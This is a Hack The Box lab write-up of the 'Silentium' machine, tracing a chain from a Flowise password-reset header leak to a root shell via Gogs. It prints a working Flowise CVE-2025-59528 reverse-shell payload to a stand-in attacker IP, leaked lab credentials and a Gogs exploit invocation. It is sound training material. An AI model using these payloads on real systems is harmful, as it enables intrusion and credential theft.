# Silentium (HTB) - Production Writeup

Author: Trushit Oza
Date: 2026-04-15
Difficulty: Easy
Platform: Linux
Machine: Silentium

## Executive Summary

This assessment documents full compromise of the Silentium Hack The Box target from external reconnaissance to host-level root access. The attack path relied on chained weaknesses across multiple components:

1. Weak perimeter exposure and virtual host discovery.
2. Critical information disclosure in Flowise forgot-password workflow.
3. Authenticated Remote Code Execution (RCE) in Flowise CustomMCP (CVE-2025-59528).
4. Credential reuse enabling SSH access as ben.
5. Local service abuse of Gogs running as root, followed by symlink-based file overwrite exploitation (CVE-2025-8110) to obtain root shell on host.

Impact: Complete compromise of confidentiality, integrity, and availability on the target host.

## Scope

- Target IP: 10.129.25.128
- Domain: silentium.htb

Note: One scan command in operator notes targeted 10.129.23.143. The validated machine target throughout this writeup is 10.129.25.128.

## Attack Narrative

### 1) External Reconnaissance

Initial service discovery:

```bash
nmap -sCV -A 10.129.25.128 -oN nmap.txt
```

Key results:

- 22/tcp: OpenSSH 9.6p1 (Ubuntu)
- 80/tcp: nginx 1.24.0 (Ubuntu)
- HTTP redirects to http://silentium.htb/

Host mapping:

```bash
echo "10.129.25.128 silentium.htb" | sudo tee -a /etc/hosts
```

Main website review exposed leadership names, including Ben (Head of Financial Systems), supporting likely username/email generation patterns.

### 2) Virtual Host/Subdomain Enumeration

Subdomain fuzzing revealed staging environment:

```bash
ffuf -u http://10.129.25.128 -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -c -k -fs 0
```

Add discovered vhost:

```bash
echo "10.129.25.128 staging.silentium.htb" | sudo tee -a /etc/hosts
```

The staging application presented a login surface backed by Flowise APIs.

### 3) Initial Access via Flowise Information Disclosure

The forgot-password endpoint leaked full user metadata when the request contained an internal trust header.

Request:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Observed issue:

- Response included tempToken and account object for ben@silentium.htb.

Password reset with leaked token:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "<LEAKED_TEMP_TOKEN>",
      "password": "<NEW_PASSWORD>"
    }
  }'
```

Login to obtain authenticated token/session:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"username":"ben@silentium.htb","password":"<NEW_PASSWORD>"}'
```

### 4) Flowise RCE (CVE-2025-59528)

Vulnerability: Flowise CustomMCP unsafe evaluation via Function() constructor in mcpServerConfig enables command execution in Node.js runtime.

- CVE: CVE-2025-59528
- CVSS: 10.0 (Critical)
- Affected range (as observed): Flowise >= 2.2.7-patch.1 and < 3.0.6

Listener:

```bash
rlwrap nc -lnvp 4444
```

Exploit API endpoint:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <FLOWISE_AUTH_TOKEN>" \
  -d '{
    "loadMethod": "listTools",
    "nodeData": {
      "inputs": {
        "mcpServerConfig": "({x:(function(){ const cp = process.mainModule.require(\"child_process\"); const net = process.mainModule.require(\"net\"); const sh = cp.spawn(\"/bin/sh\", [\"-i\"]); const client = new net.Socket(); client.connect(4444, \"<ATTACKER_IP>\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return 1; })()})"
      }
    }
  }'
```

Result:

- Shell obtained as root inside a container, not on host.

### 5) Container Post-Exploitation and Credential Harvesting

From container shell, environment variables and local artifacts exposed sensitive credentials/secrets.

Commands:

```bash
env
sqlite3 ~/.flowise/database.sqlite "SELECT name, passwd, salt FROM user;"
cat ~/.flowise/encryption.key
```

Notable recovered values:

- FLOWISE_USERNAME=ben
- FLOWISE_PASSWORD=F1l3_d0ck3r
- SMTP_PASSWORD=r04D!!\_R4ge
- JWT_AUTH_TOKEN_SECRET=<secret>

### 6) Pivot to Host via SSH (Credential Reuse)

SMTP password was reused for local Linux account ben.

```bash
ssh ben@10.129.25.128
# password: r04D!!_R4ge
```

User flag:

```bash
cat ~/user.txt
```

### 7) Internal Service Enumeration

Local listening services:

```bash
ss -tlnp
```

Observed:

- 127.0.0.1:3001 -> Gogs
- 127.0.0.1:3000 -> Flowise (Docker)
- 127.0.0.1:8025/1025 -> Mailhog

Gogs config review:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

Critical misconfiguration:

- RUN_USER=root

This dramatically increases impact of any Gogs code execution/vector to immediate host root compromise.

### 8) Gogs Access and Exploitation (CVE-2025-8110)

SSH tunnel for local API/UI access:

```bash
ssh -N -f -L 3001:127.0.0.1:3001 ben@10.129.25.128
```

API requires expected Host header:

```bash
curl -s -H "Host: staging-v2-code.dev.silentium.htb" \
  http://127.0.0.1:3001/api/v1/repos/search
```

Workflow:

1. Register user in Gogs UI.
2. Generate API token.
3. Run a CVE-2025-8110 exploit script to abuse symlink file overwrite and inject malicious git config/hook behavior.
4. Trigger reverse shell.

Listener:

```bash
nc -nvlp 5555
```

Exploit execution pattern:

```bash
python3 exploit.py \
  -u http://localhost:3001 \
  -un <GOGS_USER> \
  -pw <GOGS_PASS> \
  -t <GOGS_TOKEN> \
  -lh <ATTACKER_IP> \
  -lp 5555
```

Result:

- Root shell on host.

Root flag:

```bash
cat /root/root.txt
```

## Vulnerability Chain Summary

| Stage              | Weakness                                       | Severity | Impact                       |
| ------------------ | ---------------------------------------------- | -------- | ---------------------------- |
| External web app   | Trust-header abuse in forgot-password endpoint | Critical | Account takeover             |
| Flowise runtime    | CVE-2025-59528 CustomMCP RCE                   | Critical | Container code execution     |
| Secrets management | Plaintext secrets in environment/config        | High     | Credential harvesting        |
| IAM hygiene        | Credential reuse across services               | High     | SSH pivot to host            |
| Internal SCM       | Gogs running as root                           | Critical | Direct path to host root     |
| SCM vulnerability  | CVE-2025-8110 symlink overwrite                | Critical | Privilege escalation to root |

## Root Cause Analysis

- Missing trust boundary enforcement on internal headers.
- Unsafe dynamic code evaluation in Flowise.
- Insecure secret handling and excessive secret exposure in runtime environment.
- Password reuse across unrelated services.
- Insecure service hardening (Gogs as root user).
- Delayed patching/vulnerability management for known high-risk CVEs.

## Evidence and Validation Checklist

- Nmap output confirms exposed attack surface.
- Subdomain/vhost discovery reproducible with ffuf.
- Forgot-password endpoint disclosure reproducible with crafted header.
- Flowise RCE endpoint exploitation produces interactive shell in container.
- Harvested credentials allow SSH authentication as ben.
- Gogs local access reproducible via tunnel.
- CVE-2025-8110 exploitation leads to host-level root shell.

## Final Outcome

- User-level access achieved: ben
- Privilege level achieved: root (host)
- Flags captured: user.txt and root.txt

## Disclaimer

This writeup is for authorized lab use (Hack The Box) and defensive learning. Do not test these techniques on systems without explicit permission.
